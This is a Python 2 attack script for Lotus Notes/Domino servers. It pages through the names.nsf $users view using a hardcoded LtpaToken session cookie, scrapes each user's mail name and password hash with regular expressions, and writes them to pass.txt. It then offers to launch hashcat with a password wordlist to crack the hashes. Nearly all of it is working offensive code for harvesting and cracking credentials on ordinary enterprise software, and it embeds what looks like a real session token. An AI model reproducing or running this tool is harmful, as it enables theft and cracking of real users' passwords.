import requests
import re
import sys
import os

def banner():

    __info__ = """
        Lotus Notes/Domino 5
            hashcat -m8600

        Lotus Notes/Domino 6
            hashcat -m8700 -a0 pass.txt --username e:\Tools\PassList\Passwords\top10w.txt  --potfile-disable --force

        Lotus Notes/Domino 8
            hashcat -m9100
    """
    
    print """
 _          _               _               _     
| |    ___ | |_ _   _ ___  | |__   __ _ ___| |__  
| |   / _ \| __| | | / __| | '_ \ / _` / __| '_ \ 
| |__| (_) | |_| |_| \__ \ | | | | (_| \__ \ | | |
|_____\___/ \__|\__,_|___/ |_| |_|\__,_|___/_| |_|\n\n"""

    if len(sys.argv) != 2:
        print "[x] python lotus.py http://example.com"
        exit(1)



def lotus(url):

    for x in xrange(1,1000,19):

        base_url = "{0}/names.nsf/$users?OpenView&Start={1}".format(url, x)

        # set cookies 
        cookies = {"myusername": "liutao", "LtpaToken": "AAECAzVCNzkyNUI4NUI3OTVERjhDTj0TwfUTzM4vTz1jcjE4ZxTqCOTD3y0xWOGmI+hHBhsjy8g+"}
        headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "http://baidu.com/names.nsf/$users?OpenView&Start=39", "Accept-Language": "zh-CN,zh;q=0.9", "If-Modified-Since": "Mon, 22 Jan 2018 04:11:17 GMT", "Connection": "close"}

        try:
            r = requests.get(base_url, headers=headers, cookies=cookies)
        except:
            print "[x] Url is error or not set Cookie !!!"
            exit(1)

        re_user = re.compile(r'<font size="2">mail/(.*?)</font>')
        re_pass = re.compile(r'<font size="2">\((.*?)</font>')

        re_user_list = re_user.findall(r.content)
        re_pass_list = re_pass.findall(r.content)
 
        for x in xrange(len(re_user_list)):
            try:
                user_pass = re_user_list[x] + ':(' + re_pass_list[x]
                print user_pass
                with open('pass.txt', 'a') as f:
                    f.writelines(user_pass + '\n')
            except:
                pass


def hashcat():
    choose = raw_input('\n\n[*] Try use hashcat to cracking (y/N) ')
    if choose == 'y':
        try:
            os.system("hashcat64.exe -m8700 -a0 pass.txt --username E:\Tools\PassList\Passwords\\top10w.txt  --potfile-disable --force")
        except:
            print "[x] hashcat not found :("
            exit(1)
    else:
        print "[!] Bye"
        exit(1)



if __name__ == '__main__':

    banner()
    lotus(sys.argv[1])
    hashcat()

